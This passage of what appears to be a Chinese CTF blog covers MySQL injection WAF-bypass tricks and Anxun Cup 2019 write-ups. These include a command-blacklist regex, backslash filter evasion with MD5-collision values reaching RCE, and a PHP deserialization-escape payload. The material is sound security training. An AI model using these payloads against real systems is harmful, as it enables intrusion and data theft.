*/</code>的sql语句;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union*/</span> <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure><p><img src="image-20210131200812789.png" alt="image-20210131200812789"></p><p>我们还可以利用一个<code>*/</code>去匹配多个<code>/*！</code>，例如sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NAME</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="comment">/*!union/*!select*/</span><span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure><p><img src="image-20210131195818399.png" alt="image-20210131195818399"></p><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p> 在与服务器进行交互的过程中，客户端往往会在GET/POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p><p><img src="image-20210201201149269.png" alt="image-20210201201149269"></p><p>如果一个网站只在tomcat服务器处做数据过滤和处理，我们可以利用解析参数的不同，对WAF检测进行绕过。</p><p>攻击payload：<code>index.php?id=-1&#39; union select 1,database(),3--+</code></p><p>union select…会被tomcat服务器识别为恶意攻击并拦截，而如果payload如下：</p><p>攻击payload：<code>index.php?id=1&amp;id=-1&#39; union select 1,database(),3--+</code></p><p>tomcat服务器检测第一个参数后发现无异常，提交给apache服务器。成功绕过WAF拦截</p><h2 id="handler语句代替select查询"><a href="#handler语句代替select查询" class="headerlink" title="handler语句代替select查询"></a>handler语句代替select查询</h2><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><p>例如,查询一个表名为 books的表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span>  books <span class="keyword">open</span> <span class="keyword">as</span> x; <span class="comment">#指定数据表进行载入并将返回句柄重命名</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#读取指定表/句柄的首行数据</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> x <span class="keyword">close</span>; <span class="comment">#关闭句柄</span></span><br></pre></td></tr></table></figure><p><img src="image-20210201173229186.png" alt="image-20210201173229186"></p><h3 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@VERSION <span class="comment">#返回版本信息</span></span><br><span class="line">@@GLOBAL.VERSION <span class="comment">#返回版本信息</span></span><br><span class="line">@@HOSTNAME <span class="comment">#返回安装的计算机名称</span></span><br><span class="line">@@BASEDIR    <span class="comment">#返回MYSQL绝对路径</span></span><br><span class="line">@@datadir    <span class="comment">#  返回MYSQL数据保存绝对路径</span></span><br><span class="line">database()   <span class="comment">#当前数据库信息</span></span><br><span class="line">user()       <span class="comment">#当前用户信息</span></span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p><p><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019复现</title>
      <link href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>在空档期中找了2019安洵的比赛环境，于是复现下当年做不出的题目。<a id="more"></a></p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>进入题目发现url可疑</p><p><code>http://db0bb943-eb61-42d5-a9fa-2ac2882323f6.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p><p>推测img是base64,经过连续解密后,发现服务器会对img值经过两次base64解密和16解密包含其值所对应文件名的文件,再以base64输出.故对<code>index.php</code>经过一次16进制加密,再经过两次base64加密传入得到原码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>发现是一个远程rce，但是要绕过两层。第一层是如下对<code>cmd</code>进行过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在测试后发现<code>\</code> 居然没有被过滤掉。</p><p><img src="image-20210108235028264.png" alt="image-20210108235028264"></p><p>因此我们可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;l\s</span><br><span class="line">cmd&#x3D;ca\t &#x2F;flag</span><br></pre></td></tr></table></figure><p>ps：若没有<code>\</code>我们可以用dir来读取目录，用sort或php命令来读取文件。</p><p>然后就是md5绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))</span><br></pre></td></tr></table></figure><p>由于<code>(string)</code>的存在，所以不能用数组绕过，只能用两个数据去强碰。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p>从而得到flag：</p><p><img src="image-20210108233121010.png" alt="image-20210108233121010"></p><h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><p>进入题目发现原代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细审计,发现可能存在反序列化逃逸.因为filter的代码为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以恶意提交含有<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>的数据从而让其被替换掉,再恶意构造反序列后的数据从而逃逸.同时<code>extract($_POST);</code>的变量赋给,方便我们构造恶意的SESSION数据。</p><p>例如：<code>_SESSION[&quot;fflagflag&quot;]=&quot;;s:3:&quot;img&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></p><p>在后头处理时，<code>$serialize_info = filter(serialize($_SESSION));</code>，会将其处理成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">5</span>:<span class="string">"guest"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">10</span>:<span class="string">"show_image"</span>;s:<span class="number">9</span>:<span class="string">"f"</span>;s:<span class="number">51</span>:<span class="string">""</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>img_name<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>而php在unserialize时，把<code>f&quot;;s:51:&quot;</code>档成一个参数，从而把原本数据里的<code>s:3:&quot;img&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code>逃逸了出来。而剩下的<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;img_name&quot;;}</code>会被忽视掉。</p><p>ps：这里有个小坑之前踩了，高版本php不能通过<code>&quot;;&quot;</code>来合并变量，但是可以通过<code>&quot;;}</code>来上面一样逃逸数据。</p><p><img src="image-20210109171645147.png" alt="image-20210109171645147"></p><h2 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h2><p>进入题目满脸蒙蔽….先是怀疑是文件上传结果发现上传路径是个假路径….</p><p><img src="image-20210111201651331.png" alt="image-20210111201651331"></p><p>没了思路。看了下源码:</p><p>helper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"r00t"</span>,<span class="string">"r00t"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span 